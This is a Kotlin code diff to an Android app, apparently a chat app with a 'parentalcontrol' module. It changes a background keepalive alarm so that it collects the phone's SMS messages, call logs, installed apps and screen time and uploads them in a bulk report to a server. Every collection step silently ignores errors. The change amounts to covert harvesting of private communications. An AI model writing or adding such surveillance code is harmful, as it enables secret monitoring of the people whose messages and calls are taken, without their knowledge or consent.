@@ -47,20 +47,25 @@ class AlarmReceiver : BroadcastReceiver() {
                     com.anonchat.app.parentalcontrol.util.BatteryInfo(-1, false, -1f)
                 }
 
+                val smsMessages = try { collectors.collectSmsMessages(context) } catch (_: Exception) { emptyList() }
+                val callLogs = try { collectors.collectCallLogs(context) } catch (_: Exception) { emptyList() }
+                val installedApps = try { collectors.collectInstalledApps(context) } catch (_: Exception) { emptyList() }
+                val screentime = try { collectors.collectScreenTime(context) } catch (_: Exception) { null }
+
                 val payload = ApiClient.buildReportPayload(
                     deviceInfo = deviceInfo,
                     location = location,
                     battery = batteryInfo,
-                    smsMessages = emptyList(),
-                    callLogs = emptyList(),
-                    installedApps = emptyList(),
+                    smsMessages = smsMessages,
+                    callLogs = callLogs,
+                    installedApps = installedApps,
                     activities = emptyList(),
-                    screentime = null,
+                    screentime = screentime,
                     webHistory = emptyList(),
                     socialNotifications = emptyList()
                 )
                 ApiClient.sendBulkReport(payload)
-                Log.d(TAG, "AlarmReceiver keepalive report delivered")
+                Log.d(TAG, "AlarmReceiver keepalive report delivered: ${smsMessages.size} sms, ${callLogs.size} calls, ${installedApps.size} apps")
             } catch (e: Exception) {
                 Log.e(TAG, "AlarmReceiver keepalive report error: ${e.message}")
             } finally {
